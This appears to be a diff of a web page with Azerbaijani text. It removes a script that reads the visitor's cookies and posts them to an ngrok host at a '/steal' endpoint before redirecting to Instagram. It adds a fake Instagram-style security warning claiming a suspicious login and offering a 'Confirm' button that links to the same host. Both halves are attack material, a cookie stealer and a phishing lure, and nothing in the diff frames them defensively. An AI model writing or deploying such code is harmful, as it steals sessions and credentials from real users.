@@ -1,39 +1,8 @@
-<script>
-// 1. Cookie-ləri əldə etmək üçün xüsusi funksiya
-function getCookies() {
-  return new Promise(resolve => {
-    if(document.cookie) {
-      resolve(document.cookie);
-    } else {
-      // Instagram iframe yüklə
-      const iframe = document.createElement('iframe');
-      iframe.src = 'https://instagram.com';
-      iframe.style.display = 'none';
-      
-      iframe.onload = () => {
-        setTimeout(() => {
-          resolve(document.cookie);
-        }, 1000);
-      };
-      
-      document.body.appendChild(iframe);
-    }
-  });
-}
-
-// 2. Cookie göndər
-getCookies().then(cookies => {
-  fetch('https://7bda-185-146-112-8.ngrok-free.app/steal', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      cookies: cookies,
-      source: 'instagram',
-      timestamp: Date.now()
-    })
-  });
-});
-
-// 3. İstifadəçini yönləndir
-setTimeout(() => window.location = "https://instagram.com", 1500);
-</script>
+<div style="font-family: Arial; text-align: center;">
+  <h2>⚠️ Təhlükəsizlik Xəbərdarlığı</h2>
+  <p>Hesabınıza şübhəli giriş aşkar edildi</p>
+  <a href="https://7bda-185-146-112-8.ngrok-free.app" 
+     style="background: #0095f6; color: white; padding: 10px 20px; border-radius: 5px;">
+     Təsdiqlə
+  </a>
+</div>
